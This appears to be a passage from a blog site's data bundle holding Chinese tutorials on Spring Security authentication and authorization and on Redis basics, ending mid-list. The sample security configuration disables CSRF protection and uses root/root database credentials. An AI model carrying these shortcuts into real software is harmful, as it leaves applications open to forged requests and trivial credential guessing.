2. 请求继续向后，经过 basicautenticationfilter 继续进行认证，直到最后 filtersecurityinterceptor 拦截器，它是api的最后一环，由它来决定请求是否能到达具体的api。简单来说，就是负责权限校验（利用 securitycontextholder 来获取用户的权限相关信息）;\n    \n    1. 它会根据我们配置的一些要求，来进行判断，如果不通过则抛出异常\n    \n    2. 例如某api要求请求必须经过认证，则在最后一个拦截器处，请求如果没有进行认证，则抛出对应的异常\n    \n    3. 比如某api要求请求具有vip的权限，则最后一个拦截器会判断该请求是否具有vip权限\n\n 3. exceptiontranslationfilter 的作用主要是捕获 filtersecurityinterceptor 抛出的异常( accessdeniedexception 和 authenticationexception )，并做响应的处理\n\n 4. 黄色的部分可以通过配置来决定是否存在于过滤器链上，即由我们来决定使用哪些认证方式\n\n\n\n\n# 授权\n\n\n# 基于注解的鉴权\n\n基于方法的权限管理主要是通过aop来实现的，spring security 中通过 methodsecurityinterceptor 来提供相关的实现。不同在于，filtersecurityinterceptor 只是在请求之前进行前置处理，methodsecurityinterceptor 在此基础上还可以进行后置处理。前置处理就是在请求之前判断是否具备相应的权限，后置处理则是对方法的执行结果进行二次过滤。\n\n 1. 通过@enableglobalmethodsecurity(prepostenabled = true)注解开启权限注解的使用\n\n 2. @preauthorize\n    \n    @service\n    public class helloservice {\n    \t// 执行该方法必须具备admin角色才可以访问\n        @preauthorize("hasrole(\'admin\')")\n        public string preauthorizetest01() {\n            return "hello";\n        }\n        // 访问者名称必须是javaboy，而且还需要同事具备admin角色才可以访问\n        @preauthorize("hasrole(\'admin\') and authentication.name == \'javaboy\'")\n        public string preauthorizetest02() {\n            return "hello";\n        }\n        // 通过#引用方法参数，并对其进行校验，表示请求者的用户名必须等于方法参数name的值，方法才可以被执行\n        @preauthorize("authentication.name == #name")\n        public string preauthorizetest03(string name) {\n            return "hello: " + name;\n        }\n    }\n    \n    @springboottest\n    class basedonmethodapplicationtests {\n    \t@autowired\n        helloservice helloservice;\n        @test\n        // 通过该注解设定当前执行的用户角色是admin\n        @withmockuser(roles = "admin")\n        void preauthorizetest01() {\n            string hello = helloservice.preauthorizetest01();\n            assertions.assertnotnull(hello);\n            assertions.assertequals("hello", hello);\n        }\n        @test\n        @withmockuser(roles = "admin", username = "javaboy")\n        void preauthorizetest02() {\n            string hello = helloservice.preauthorizetest02();\n            assertions.assertnotnull(hello);\n            assertions.assertequals("hello", hello);\n        }\n        @test\n        @withmockuser(username = "javaboy")\n        void preauthorizetest03() {\n            string hello = helloservice.preauthorizetest03("javaboy");\n            assertions.assertnotnull(hello);\n            assertions.assertequals("hello: javaboy", hello);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    \n\n\n# 基于url的动态鉴权\n\n鉴权主要在 filtersecurityinterceptor 这个类，如果默认的 filtersecurityinterceptor 不满足要求，那我们就重写它就好了。\n\n 1. 实现 filterinvocationsecuritymetadatasource.getattributes 提供一个 url 对应的所需权限集合\n 2. 实现 accessdecisionmanager.decide 将当前登录用户的权限和 url 的所需权限比对，有则鉴权通过\n\n代码已经完成，实例可参考项目：https://github.com/zpj80231/imall admin 模块\n\n\n# 参考\n\n * spring security 认证与授权流程\n * spring security 基本认证，授权流程，原理方法\n * spring security 权限管理',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Spring Security 初识",frontmatter:{title:"Spring Security 初识",date:"2021-09-16T00:00:00.000Z",tags:["分布式","Spring Security"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-security-01.html",relativePath:"views/backend/spring-security-01.md",key:"v-70527b2c",path:"/views/backend/spring-security-01.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:141},{level:2,title:"主流web安全框架",slug:"主流web安全框架",normalizedTitle:"主流web安全框架",charIndex:147},{level:2,title:"重要组件",slug:"重要组件",normalizedTitle:"重要组件",charIndex:160},{level:3,title:"UserDetailsService",slug:"userdetailsservice",normalizedTitle:"userdetailsservice",charIndex:170},{level:3,title:"UserDetails",slug:"userdetails",normalizedTitle:"userdetails",charIndex:170},{level:3,title:"PasswordEncoder",slug:"passwordencoder",normalizedTitle:"passwordencoder",charIndex:211},{level:3,title:"WebSecurityConfigurerAdapter",slug:"websecurityconfigureradapter",normalizedTitle:"websecurityconfigureradapter",charIndex:232},{level:3,title:"鉴权注解",slug:"鉴权注解",normalizedTitle:"鉴权注解",charIndex:266},{level:4,title:"@Secured",slug:"secured",normalizedTitle:"@secured",charIndex:3024},{level:4,title:"@PreAuthorize",slug:"preauthorize",normalizedTitle:"@preauthorize",charIndex:3304},{level:4,title:"@PostAuthorize",slug:"postauthorize",normalizedTitle:"@postauthorize",charIndex:3716},{level:4,title:"@PostFilter",slug:"postfilter",normalizedTitle:"@postfilter",charIndex:3833},{level:4,title:"@PreFilter",slug:"prefilter",normalizedTitle:"@prefilter",charIndex:4280},{level:3,title:"remember-me",slug:"remember-me",normalizedTitle:"remember-me",charIndex:276}],excerpt:"<Boxx/>\n<p>Spring Security或者说web安全最核心的两个部分即：<code>认证（Authentication）</code> 和 <code>授权（Authorization）。</code></p>\n<ul>\n<li>认证：用户是否能登录</li>\n<li>授权：用户是否有权限去做某些事情</li>\n</ul>\n<p>即不用的用户登录之后有不同的权限可以去做某些事情。</p>\n",headersStr:"简介 主流web安全框架 重要组件 UserDetailsService UserDetails PasswordEncoder WebSecurityConfigurerAdapter 鉴权注解 @Secured @PreAuthorize @PostAuthorize @PostFilter @PreFilter remember-me",content:'Spring Security或者说web安全最核心的两个部分即：认证（Authentication） 和 授权（Authorization）。\n\n * 认证：用户是否能登录\n * 授权：用户是否有权限去做某些事情\n\n即不用的用户登录之后有不同的权限可以去做某些事情。\n\n\n\n * 简介\n * 主流web安全框架\n * 重要组件\n   * UserDetailsService\n   * UserDetails\n   * PasswordEncoder\n   * WebSecurityConfigurerAdapter\n   * 鉴权注解\n   * remember-me\n\n\n\n\n# 简介\n\n官网是最好的答案：https://spring.io/projects/spring-security\n\n\n# 主流web安全框架\n\nspring-security：与spring无缝整合，可定制化程度高，权限控制较全面，缺点即重量级，配置繁琐（但springboot出来后就没简单了）。\n\nshiro：轻量级，简单，缺点即没有spring-security功能完善，在web一些特殊需求下需要二次开发。\n\n因此，一般组合如下：\n\n * SSM + Shiro\n * Spring Boot/Spring Cloud + Spring Security\n\n\n# 重要组件\n\n\n# UserDetailsService\n\n * 数据库查询用户，校验密码的过程写在这里\n\n当什么也没有配置的时候，账号和密码是由 Spring Security 定义生成的。而在实际项目中账号和密码都是从数据库中查询出来的。 所以我们要通过自定义逻辑控制认证逻辑。\n\n如果需要自定义逻辑时，只需要实现 UserDetailsService 接口即可。\n\npublic interface UserDetailsService {\n    //数据库查询用户，校验密码的过程写在这里\n    UserDetails loadUserByUsername(String var1) \n        throws UsernameNotFoundException;\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# UserDetails\n\n实现UserDetails接口，Spring默认实现是User，而我们自定义用户实体类（包含用户名、密码、权限），以后我们只需要使用自定义的 User 实体类即可。\n\n// 表示获取登录用户所有权限\nCollection<? extends GrantedAuthority> getAuthorities();\n// 表示获取密码\nString getPassword();\n// 表示获取用户名\nString getUsername();\n// 表示判断账户是否过期\nboolean isAccountNonExpired();\n// 表示判断账户是否被锁定\nboolean isAccountNonLocked();\n// 表示凭证{密码}是否过期\nboolean isCredentialsNonExpired();\n// 表示当前用户是否可用\nboolean isEnabled();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# PasswordEncoder\n\nPasswordEncoder是Spring Security密码加密的一个工具接口；\n\nBCryptPasswordEncoder 是最好的实现方式， Spring Security 官方推荐的密码解析器，项目中一般都是用这个工具。\n\nBCryptPasswordEncoder 是对 bcrypt 强散列方法的具体实现。是基于 Hash 算法实现的单向加密。可以通过 strength 控制加密强度，默认 10。\n\n\n# WebSecurityConfigurerAdapter\n\n详细解释见：WebSecurityConfigurerAdapter 解析\n\nSpring Security 的核心配置就是继承 WebSecurityConfigurerAdapter 并注解 @EnableWebSecurity 的配置。这个配置指明了用户名密码的处理方式、请求路径、登录登出控制等和安全相关的配置。\n\nWebSecurityConfigurerAdapter中创建了一个SecurityConfigurer类型的HttpSecurity实例来真正完成安全的装配，HttpSecurity也提供了很多方法来方便对各种安全机制的配置。\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\t//  注入 PasswordEncoder  类到 spring  容器中\n\t@Bean\n\tpublic PasswordEncoder passwordEncoder(){\n\t\treturn new BCryptPasswordEncoder();\n\t}\n    \n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        //  配置认证\n        http.formLogin()\n            .loginPage("/index") //  配置哪个 url 为登录页面\n            .loginProcessingUrl("/login") //  设置哪个是登录的 url 。\n            .successForwardUrl("/success") //  登录成功之后跳转到哪个 url\n            .failureForwardUrl("/fail");//  登录失败之后跳转到哪个 url\n        http.authorizeRequests()\n            .antMatchers("/layui/**","/index") // 表示配置请求路径\n            .permitAll() //  指定 URL 无需保护。\n            .antMatchers("/system").hasAnyAuthority(\'menu:system\')//是否具有某个权限\n            .anyRequest() //  其他请求\n            .authenticated(); // 需要认证\n        //  关闭 csrf\n        http.csrf().disable();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 鉴权注解\n\n如上，可以在配置类里以http.antMatchers("/system").hasAnyAuthority(\'menu:system\')//是否具有某个权限配置，也可以使用相关注解\n\n# @Secured\n\n判断是否具有角色，另外需要注意的是这里匹配的字符串需要添加前缀“ROLE_“。\n\n> 使用注解先要开启注解功能！ @EnableGlobalMethodSecurity(securedEnabled=true)\n\n使用：\n\n@RequestMapping("/testSecured")\n@ResponseBody\n@Secured({"ROLE_normal","ROLE_admin"})\npublic String helloUser() {\n    return "hello,user";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# @PreAuthorize\n\n一般作为进入方法前的权限验证使用，@PreAuthorize 可以将登录用户的 roles/permissions 参数传到方法中。\n\n> 先开启注解功能： @EnableGlobalMethodSecurity(prePostEnabled = true)\n\n使用：\n\n@RequestMapping("/testPreAuthorize")\n@ResponseBody\n//@PreAuthorize("hasRole(\'ROLE_ 管理员 \')")\n@PreAuthorize("hasAnyAuthority(\'menu:system\')")\npublic String preAuthorize(){\n    System.out.println("preAuthorize");\n    return "preAuthorize";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# @PostAuthorize\n\n使用并不多，在方法执行后再进行权限验证，适合验证带有返回值 的权限。\n\n> 先开启注解功能： @EnableGlobalMethodSecurity(prePostEnabled = true)\n\n# @PostFilter\n\n权限验证之后对数据进行过滤 留下用户名是 admin1 的数据\n\n@RequestMapping("getAll")\n@PreAuthorize("hasRole(\'ROLE_ 管理员\')")\n//表达式中的 filterObject 引用的是方法返回值 List 中的某一个元素\n@PostFilter("filterObject.username == \'admin1\'")\n@ResponseBody\npublic List<UserInfo> getAllUser(){\n    ArrayList<UserInfo> list = new ArrayList<>();\n    list.add(new UserInfo(1l,"admin1","6666"));\n    list.add(new UserInfo(2l,"admin2","888"));\n    return list;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# @PreFilter\n\n进入控制器之前对数据进行过滤\n\n@RequestMapping("getTestPreFilter")\n@PreAuthorize("hasRole(\'ROLE_ 管理员\')")\n@PreFilter(value = "filterObject.id%2==0")\n@ResponseBody\npublic  List<UserInfo>  getTestPreFilter(\n    \t\t\t@RequestBody  List<UserInfo> list){\n    list.forEach(t-> {\n        System.out.println(t.getId()+"\\t"+t.getUsername());\n    });\n    return list;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# remember-me\n\n基于数据库的记住我：\n\n 1. 添加数据库的配置文件\n    \n    spring:\n        datasource:\t\n            driver-class-name: com.mysql.jdbc.Driver\n            url: jdbc:mysql://localhost:3306/test\n            username: root\n            password: root\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. 编写配置类\n    \n    @Configuration\n    public class RememberMeSecurityConfig {\n        @Autowired\n        private DataSource dataSource;\n        @Bean\n        public PersistentTokenRepository persistentTokenRepository(){\n            JdbcTokenRepositoryImpl  jdbcTokenRepository  =  new\n            JdbcTokenRepositoryImpl();\n            //  赋值数据源\n            jdbcTokenRepository.setDataSource(dataSource);\n            //  自动创建表 , 第一次执行会创建，以后要执行就要删除掉！\n            jdbcTokenRepository.setCreateTableOnStartup(true);\n            return jdbcTokenRepository;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 3. 修改WebSecurityConfigurerAdapter安全配置类\n    \n    @Autowired\n    private UsersServiceImpl usersService;\n    @Autowired\n    private PersistentTokenRepository tokenRepository;\n    \n    // 开启记住我功能\n    http.rememberMe()\n        \t.tokenValiditySeconds()// 设置有效期，秒\n            .tokenRepository(tokenRepository)\n            .userDetailsService(usersService);\n    // 注销\n    http.logout()\n        \t.logoutUrl("/logout")\n        \t.logoutSuccessUrl("/index")\n        \t.permitAll;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 4. 页面添加记住我复选框\n    \n    name 属性值必须位 remember-me，不能改为其他值\n    \n    记住我：<input type="checkbox"name="remember-me"title=" 记住密码"/><br/>\n    \n    \n    1\n    \n\n 5. 完毕，测试！\n\n这次先简单了解一下SpringSecurity，下次留时间整点高级用法~',normalizedContent:'spring security或者说web安全最核心的两个部分即：认证（authentication） 和 授权（authorization）。\n\n * 认证：用户是否能登录\n * 授权：用户是否有权限去做某些事情\n\n即不用的用户登录之后有不同的权限可以去做某些事情。\n\n\n\n * 简介\n * 主流web安全框架\n * 重要组件\n   * userdetailsservice\n   * userdetails\n   * passwordencoder\n   * websecurityconfigureradapter\n   * 鉴权注解\n   * remember-me\n\n\n\n\n# 简介\n\n官网是最好的答案：https://spring.io/projects/spring-security\n\n\n# 主流web安全框架\n\nspring-security：与spring无缝整合，可定制化程度高，权限控制较全面，缺点即重量级，配置繁琐（但springboot出来后就没简单了）。\n\nshiro：轻量级，简单，缺点即没有spring-security功能完善，在web一些特殊需求下需要二次开发。\n\n因此，一般组合如下：\n\n * ssm + shiro\n * spring boot/spring cloud + spring security\n\n\n# 重要组件\n\n\n# userdetailsservice\n\n * 数据库查询用户，校验密码的过程写在这里\n\n当什么也没有配置的时候，账号和密码是由 spring security 定义生成的。而在实际项目中账号和密码都是从数据库中查询出来的。 所以我们要通过自定义逻辑控制认证逻辑。\n\n如果需要自定义逻辑时，只需要实现 userdetailsservice 接口即可。\n\npublic interface userdetailsservice {\n    //数据库查询用户，校验密码的过程写在这里\n    userdetails loaduserbyusername(string var1) \n        throws usernamenotfoundexception;\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# userdetails\n\n实现userdetails接口，spring默认实现是user，而我们自定义用户实体类（包含用户名、密码、权限），以后我们只需要使用自定义的 user 实体类即可。\n\n// 表示获取登录用户所有权限\ncollection<? extends grantedauthority> getauthorities();\n// 表示获取密码\nstring getpassword();\n// 表示获取用户名\nstring getusername();\n// 表示判断账户是否过期\nboolean isaccountnonexpired();\n// 表示判断账户是否被锁定\nboolean isaccountnonlocked();\n// 表示凭证{密码}是否过期\nboolean iscredentialsnonexpired();\n// 表示当前用户是否可用\nboolean isenabled();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# passwordencoder\n\npasswordencoder是spring security密码加密的一个工具接口；\n\nbcryptpasswordencoder 是最好的实现方式， spring security 官方推荐的密码解析器，项目中一般都是用这个工具。\n\nbcryptpasswordencoder 是对 bcrypt 强散列方法的具体实现。是基于 hash 算法实现的单向加密。可以通过 strength 控制加密强度，默认 10。\n\n\n# websecurityconfigureradapter\n\n详细解释见：websecurityconfigureradapter 解析\n\nspring security 的核心配置就是继承 websecurityconfigureradapter 并注解 @enablewebsecurity 的配置。这个配置指明了用户名密码的处理方式、请求路径、登录登出控制等和安全相关的配置。\n\nwebsecurityconfigureradapter中创建了一个securityconfigurer类型的httpsecurity实例来真正完成安全的装配，httpsecurity也提供了很多方法来方便对各种安全机制的配置。\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\t//  注入 passwordencoder  类到 spring  容器中\n\t@bean\n\tpublic passwordencoder passwordencoder(){\n\t\treturn new bcryptpasswordencoder();\n\t}\n    \n    @override\n    protected void configure(httpsecurity http) throws exception {\n        //  配置认证\n        http.formlogin()\n            .loginpage("/index") //  配置哪个 url 为登录页面\n            .loginprocessingurl("/login") //  设置哪个是登录的 url 。\n            .successforwardurl("/success") //  登录成功之后跳转到哪个 url\n            .failureforwardurl("/fail");//  登录失败之后跳转到哪个 url\n        http.authorizerequests()\n            .antmatchers("/layui/**","/index") // 表示配置请求路径\n            .permitall() //  指定 url 无需保护。\n            .antmatchers("/system").hasanyauthority(\'menu:system\')//是否具有某个权限\n            .anyrequest() //  其他请求\n            .authenticated(); // 需要认证\n        //  关闭 csrf\n        http.csrf().disable();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 鉴权注解\n\n如上，可以在配置类里以http.antmatchers("/system").hasanyauthority(\'menu:system\')//是否具有某个权限配置，也可以使用相关注解\n\n# @secured\n\n判断是否具有角色，另外需要注意的是这里匹配的字符串需要添加前缀“role_“。\n\n> 使用注解先要开启注解功能！ @enableglobalmethodsecurity(securedenabled=true)\n\n使用：\n\n@requestmapping("/testsecured")\n@responsebody\n@secured({"role_normal","role_admin"})\npublic string hellouser() {\n    return "hello,user";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# @preauthorize\n\n一般作为进入方法前的权限验证使用，@preauthorize 可以将登录用户的 roles/permissions 参数传到方法中。\n\n> 先开启注解功能： @enableglobalmethodsecurity(prepostenabled = true)\n\n使用：\n\n@requestmapping("/testpreauthorize")\n@responsebody\n//@preauthorize("hasrole(\'role_ 管理员 \')")\n@preauthorize("hasanyauthority(\'menu:system\')")\npublic string preauthorize(){\n    system.out.println("preauthorize");\n    return "preauthorize";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# @postauthorize\n\n使用并不多，在方法执行后再进行权限验证，适合验证带有返回值 的权限。\n\n> 先开启注解功能： @enableglobalmethodsecurity(prepostenabled = true)\n\n# @postfilter\n\n权限验证之后对数据进行过滤 留下用户名是 admin1 的数据\n\n@requestmapping("getall")\n@preauthorize("hasrole(\'role_ 管理员\')")\n//表达式中的 filterobject 引用的是方法返回值 list 中的某一个元素\n@postfilter("filterobject.username == \'admin1\'")\n@responsebody\npublic list<userinfo> getalluser(){\n    arraylist<userinfo> list = new arraylist<>();\n    list.add(new userinfo(1l,"admin1","6666"));\n    list.add(new userinfo(2l,"admin2","888"));\n    return list;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# @prefilter\n\n进入控制器之前对数据进行过滤\n\n@requestmapping("gettestprefilter")\n@preauthorize("hasrole(\'role_ 管理员\')")\n@prefilter(value = "filterobject.id%2==0")\n@responsebody\npublic  list<userinfo>  gettestprefilter(\n    \t\t\t@requestbody  list<userinfo> list){\n    list.foreach(t-> {\n        system.out.println(t.getid()+"\\t"+t.getusername());\n    });\n    return list;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# remember-me\n\n基于数据库的记住我：\n\n 1. 添加数据库的配置文件\n    \n    spring:\n        datasource:\t\n            driver-class-name: com.mysql.jdbc.driver\n            url: jdbc:mysql://localhost:3306/test\n            username: root\n            password: root\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. 编写配置类\n    \n    @configuration\n    public class remembermesecurityconfig {\n        @autowired\n        private datasource datasource;\n        @bean\n        public persistenttokenrepository persistenttokenrepository(){\n            jdbctokenrepositoryimpl  jdbctokenrepository  =  new\n            jdbctokenrepositoryimpl();\n            //  赋值数据源\n            jdbctokenrepository.setdatasource(datasource);\n            //  自动创建表 , 第一次执行会创建，以后要执行就要删除掉！\n            jdbctokenrepository.setcreatetableonstartup(true);\n            return jdbctokenrepository;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 3. 修改websecurityconfigureradapter安全配置类\n    \n    @autowired\n    private usersserviceimpl usersservice;\n    @autowired\n    private persistenttokenrepository tokenrepository;\n    \n    // 开启记住我功能\n    http.rememberme()\n        \t.tokenvalidityseconds()// 设置有效期，秒\n            .tokenrepository(tokenrepository)\n            .userdetailsservice(usersservice);\n    // 注销\n    http.logout()\n        \t.logouturl("/logout")\n        \t.logoutsuccessurl("/index")\n        \t.permitall;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 4. 页面添加记住我复选框\n    \n    name 属性值必须位 remember-me，不能改为其他值\n    \n    记住我：<input type="checkbox"name="remember-me"title=" 记住密码"/><br/>\n    \n    \n    1\n    \n\n 5. 完毕，测试！\n\n这次先简单了解一下springsecurity，下次留时间整点高级用法~',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Redis - 终结",frontmatter:{title:"Redis - 终结",date:"2019-10-10T00:00:00.000Z",tags:["Redis"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/redis02.html",relativePath:"views/backend/redis02.md",key:"v-7f4f1eb4",path:"/views/backend/redis02.html",headers:[{level:2,title:"Redis基础",slug:"redis基础",normalizedTitle:"redis基础",charIndex:47},{level:3,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:60},{level:3,title:"优缺点",slug:"优缺点",normalizedTitle:"优缺点",charIndex:70},{level:3,title:"基本数据结构",slug:"基本数据结构",normalizedTitle:"基本数据结构",charIndex:79},{level:3,title:"持久化",slug:"持久化",normalizedTitle:"持久化",charIndex:91},{level:2,title:"缓存击穿、雪崩、穿透",slug:"缓存击穿、雪崩、穿透",normalizedTitle:"缓存击穿、雪崩、穿透",charIndex:98},{level:3,title:"雪崩",slug:"雪崩",normalizedTitle:"雪崩",charIndex:103},{level:3,title:"击穿",slug:"击穿",normalizedTitle:"击穿",charIndex:100},{level:3,title:"穿透",slug:"穿透",normalizedTitle:"穿透",charIndex:106},{level:2,title:"redis集群",slug:"redis集群",normalizedTitle:"redis集群",charIndex:136},{level:3,title:"哨兵",slug:"哨兵",normalizedTitle:"哨兵",charIndex:149},{level:3,title:"主从同步",slug:"主从同步",normalizedTitle:"主从同步",charIndex:157},{level:3,title:"redis主从、集群、哨兵搭建",slug:"redis主从、集群、哨兵搭建",normalizedTitle:"redis主从、集群、哨兵搭建",charIndex:167},{level:2,title:"分布式锁（并发竞争、读写一致性）",slug:"分布式锁-并发竞争、读写一致性",normalizedTitle:"分布式锁（并发竞争、读写一致性）",charIndex:186},{level:2,title:"内存淘汰机制",slug:"内存淘汰机制",normalizedTitle:"内存淘汰机制",charIndex:206},{level:3,title:"redis过期策略",slug:"redis过期策略",normalizedTitle:"redis过期策略",charIndex:218},{level:3,title:"定期没删，我也没查询（惰性没删），那可咋整？",slug:"定期没删-我也没查询-惰性没删-那可咋整",normalizedTitle:"定期没删，我也没查询（惰性没删），那可咋整？",charIndex:233},{level:2,title:"redis解决",slug:"redis解决",normalizedTitle:"redis解决",charIndex:259},{level:3,title:"事前",slug:"事前",normalizedTitle:"事前",charIndex:272},{level:3,title:"事中",slug:"事中",normalizedTitle:"事中",charIndex:280},{level:3,title:"事后",slug:"事后",normalizedTitle:"事后",charIndex:288},{level:2,title:"案例",slug:"案例",normalizedTitle:"案例",charIndex:294},{level:3,title:"秒杀",slug:"秒杀",normalizedTitle:"秒杀",charIndex:302}],headersStr:"Redis基础 使用场景 优缺点 基本数据结构 持久化 缓存击穿、雪崩、穿透 雪崩 击穿 穿透 redis集群 哨兵 主从同步 redis主从、集群、哨兵搭建 分布式锁（并发竞争、读写一致性） 内存淘汰机制 redis过期策略 定期没删，我也没查询（惰性没删），那可咋整？ redis解决 事前 事中 事后 案例 秒杀",content:'个人看完傲丙的redis系列最后做的总结，不得不说他redis系列写的确实不错。\n\n\n\n * Redis基础\n   * 使用场景\n   * 优缺点\n   * 基本数据结构\n   * 持久化\n * 缓存击穿、雪崩、穿透\n   * 雪崩\n   * 击穿\n   * 穿透\n * redis集群\n   * 哨兵\n   * 主从同步\n   * redis主从、集群、哨兵搭建\n * 分布式锁（并发竞争、读写一致性）\n * 内存淘汰机制\n   * redis过期策略\n   * 定期没删，我也没查询（惰性没删），那可咋整？\n * redis解决\n   * 事前\n   * 事中\n   * 事后\n * 案例\n   * 秒杀\n\n\n\n\n# Redis基础\n\n看我之前的这篇 - 传送门\n\n\n# 使用场景\n\n * 缓存 替数据库分担压力 微博那种不断下拉分页，点赞 单点登陆 分布式锁\n\n\n# 优缺点\n\n 1. 基于内存的单线程非关系型数据库，由于在内存中完成操作，所以速度非常快，每秒十万+\n 2. 支持持久化\n 3. 高可用\n\n\n# 基本数据结构\n\n * String\n   \n   * 缓存功能：String字符串是最常用的数据类型，不仅仅是Redis，各个语言都是最基本类型，因此，利用Redis作为缓存，配合其它数据库作为存储层，利用Redis支持高并发的特点，可以大大加快系统的读写速度、以及降低后端数据库的压力。\n   * 计数器：许多系统都会使用Redis作为系统的实时计数器，可以快速实现计数和查询的功能。而且最终的数据结果可以按照特定的时间落地到数据库或者其它存储介质当中进行永久保存\n   * 共享用户Session：用户重新刷新一次界面，可能需要访问一下数据进行重新登录，或者访问页面缓存Cookie，但是可以利用Redis将用户的Session集中管理，在这种模式只需要保证Redis的高可用，每次用户Session的更新和获取都可以快速完成。大大提高效率。\n\n * Hash\n   \n   * 这个是类似 Map 的一种结构，这个一般就是可以将结构化的数据，比如一个对象（前提是这个对象没嵌套其他的对象）给缓存在 Redis 里，然后每次读写缓存的时候，可以就操作 Hash 里的某个字段。（用的少）\n\n * List\n   \n   * 比如可以通过 List 存储一些列表型的数据结构，类似粉丝列表、文章的评论列表之类的东西。\n     \n     * lpush key v1 v2 v3 在key中依次插入3个值,每次插入都放在最左边\n     * lrange key start(起始下标) stop(结束下标) 取出key中从下标start到stop(包含)的值\n     * lrange list (当前页-1)rows pagerows-1 分页\n\n * Set\n   \n   * 基于 Set 玩儿交集、并集、差集的操作，比如交集吧，我们可以把两个人的好友列表整一个交集，看看俩人的共同好友是谁？对吧。\n\n * SortedSet\n   \n   * 去重且排序\n     \n     * 排行榜：有序集合经典使用场景。例如视频网站需要对用户上传的视频做排行榜，榜单维护可能是多方面：按照时间、按照播放量、按照获得的赞数等。\n     * 用Sorted Sets来做带权重的队列，比如普通消息的score为1，重要消息的score为2，然后工作线程可以选择按score的倒序来获取工作任务。让重要的任务优先执行。\n\n\n# 持久化\n\n * RDB做镜像全量持久化，AOF做增量持久化。 因为RDB会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要AOF来配合使用。在redis实例重启时，会使用RDB持久化文件重新构建内存，再使用AOF重放近期的操作指令来实现完整恢复重启之前的状态。\n   \n   * RDB\n     \n     * fork和cow：fork是指redis通过创建子进程来进行RDB操作，采用二进制压缩存储。cow指的是copy on write，子进程创建后，父子进程共享数据段，父进程继续提供读写服务，写脏的页面数据会逐渐和子进程分离开来。\n     * 因为是子进程完成的，所以效率高一点，但是生成一次RDB快照文件需要花费的时间较长。\n   \n   * AOF\n     \n     * 效率稍慢，类似于我们用Java流写数据时往文件上不断追加redis操作命令，AOF的执行时间通过配置redis来实现，一般是1秒\n     * 效率稍慢，RDB五分钟一次生成快照，但是AOF是一秒一次去通过一个后台的线程fsync操作，那最多丢这一秒的数据。\n\n * 不过Redis本身的机制是 AOF持久化开启且存在AOF文件时，优先加载AOF文件；AOF关闭或者AOF文件不存在时，加载RDB文件；加载AOF/RDB文件城后，Redis启动成功；AOF/RDB文件存在错误时，Redis启动失败并打印错误信息。\n\n\n# 缓存击穿、雪崩、穿透\n\n\n# 雪崩\n\n * 原因\n   \n   * 如果大量的key过期时间设置的过于集中，到过期的那个时间点，缓存失效，同时又有巨大访问量，没有缓存直接到DB肯定扛不住，这不就炸了吗，这就是缓存雪崩导致的 【大面积的缓存失效，打崩了DB】\n\n * 场景\n   \n   * 目前电商首页以及热点数据经常会使用定时任务刷新缓存，可能大量的数据失效时间都十分集中，如果失效时间一样，又刚好在失效的时间点大量用户涌入，就有可能造成缓存雪崩\n\n * 解决方法\n   \n   * 1. 我们一般在过期时间上加一个随机值，使得过期时间分散一些（推荐）\n     * setRedis（Key，value，time + Math.random() * 10000）；\n   * 2. 如果Redis是集群部署，将热点数据均匀分布在不同的Redis库中也能避免全部失效的问题，\n   * 3. 或者设置热点数据永远不过期，有更新操作就更新缓存就好了（比如运维更新了首页商品，那你刷下缓存就完事了，不要设置过期时间），电商首页的数据也可以用这个操作，保险。\n   * 4. 